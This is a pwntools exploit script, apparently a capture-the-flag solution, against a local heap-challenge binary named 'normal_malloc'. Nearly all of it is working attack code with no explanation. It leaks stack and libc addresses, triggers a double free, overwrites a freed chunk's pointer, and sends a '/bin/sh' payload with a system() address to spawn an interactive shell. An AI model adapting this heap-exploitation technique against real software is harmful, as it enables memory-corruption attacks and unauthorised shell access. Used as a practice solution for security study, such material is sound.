from pwn import *

print("-------------------")
print("---normal_malloc---")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")


#context.log_level='debug'

binary='./normal_malloc'
s=process('./normal_malloc')
e=ELF(binary)
#lib=ELF('/lib/x86_64-linux-gnu/libc.so.6')
log.info("normal_malloc Loaded..")

def malloc():
	for i in range(2):
		log.info("1.malloc Loaded..")
		s.sendline("1")
		print s.recvuntil(":")
		s.sendline("32")
		log.info("32\n")
		print s.recvuntil(":")
		s.sendline("A")
		log.info("A\n")
		print s.recv(1024)
		print s.recv(1024)

def free():
		log.info("2.free Loaded..")
		s.sendline("2")
		print s.recvuntil(":")
		s.sendline("2")
		log.info("2\n")
		print s.recv(1024)
		print s.recv(1024)
		log.info("2.list again Loaded for double free..")
		s.sendline("2")
		print s.recvuntil(":")
		s.sendline("1")
		log.info("1\n")
		print s.recv(1024)
		print s.recv(1024)
		
def stack_leak():
	log.info("3.list Loaded..")
	s.sendline("3")
	print s.recvuntil(":")
	s.sendline("15")
	log.info("15\n")
	print s.recvuntil("Address : ")
	stack=int(s.recvuntil("\n"),16)
	s.recv(1024)	
	return stack

def libc_leak():
	log.info("3.list Loaded..")
	s.sendline("3")
	print s.recvuntil(":")
	s.sendline("7")
	log.info("7\n")
	print s.recvuntil("Address : ")
	libc=int(s.recvuntil("\n"),16)
	s.recv(1024)
	return libc

def modify():
	log.info("4.modify Loaded..")
	s.sendline("4")
	print s.recvuntil(":")
	s.sendline("1")
	log.info("1\n")
	print s.recvuntil(":")
	s.sendline(p64(stack))
	
def exit():
	log.info("5.exit Loaded..")
	s.sendline("5")

def exp():
	log.info("1.malloc Loaded to exploit :<")
	s.sendline("1")
	print s.recvuntil(":")
	s.sendline("32")
	log.info("32\n")
	print s.recvuntil(":")
	s.sendline("A"*32)
	log.info("A*32")
	s.recv(1024)
	s.recv(1024)
	log.info("1.malloc Loaded to exploit :<")
	s.sendline("1")
	print s.recvuntil(":")
	s.sendline("49")
	log.info("49\n")
	print s.recvuntil(":")
	s.sendline("/bin/sh;"+"A"*16+p64(system_addr))

s.recvuntil(">")
print s.recv(1024)
sleep(1)
stack=stack_leak() - 320 	# stack leak
libc=libc_leak() + 150368	# libc leak
print(hex(stack))
print(hex(libc))
system_addr=libc
malloc() # allocate 1st, 2nd memory chunk with size 32
free()  # free 2nd, 1st
modify()
exp()
log.info("pwned by pwnWiz :<")
s.interactive()
